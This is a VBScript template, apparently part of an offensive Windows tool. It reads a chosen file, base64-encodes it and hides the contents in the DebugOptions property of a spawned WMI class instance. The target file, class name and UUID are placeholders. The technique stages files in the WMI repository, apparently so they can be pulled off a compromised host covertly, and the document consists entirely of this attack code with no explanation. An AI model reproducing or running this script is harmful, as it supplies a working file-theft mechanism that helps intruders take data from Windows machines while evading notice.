Dim inputFile
inputFile = Base64Decode("REPLACE_WITH_TARGET_FILE")

Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1 'Binary
objStream.Open
objStream.LoadFromFile inputFile
data = objStream.Read

Set oXML = CreateObject("Msxml2.DOMDocument")
Set oNode = oXML.CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.nodeTypedValue = data
Base64Encode = oNode.text

wbemCimtypeString = 8
Set objSWbemService = GetObject("Winmgmts:root\cimv2")
Set objClass = objSWbemService.Get("REPLACE_WITH_CLASSNAME")

Set objInstance = objClass.spawninstance_
objInstance.CreationClassName = "RELEACE_WITH_UUID"
objInstance.DebugOptions = Base64Encode
objInstance.put_

Function Base64Decode(ByVal vCode)
    Set oNode = CreateObject("Msxml2.DOMDocument").CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
    Set oNode = Nothing
End Function

Function Stream_BinaryToString(Binary)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.Type = 1
    BinaryStream.Open
    BinaryStream.Write Binary
    BinaryStream.Position = 0
    BinaryStream.Type = 2
    ' All Format =>  utf-16le - utf-8 - utf-16le
    BinaryStream.CharSet = "utf-8"
    Stream_BinaryToString = BinaryStream.ReadText
    Set BinaryStream = Nothing
End Function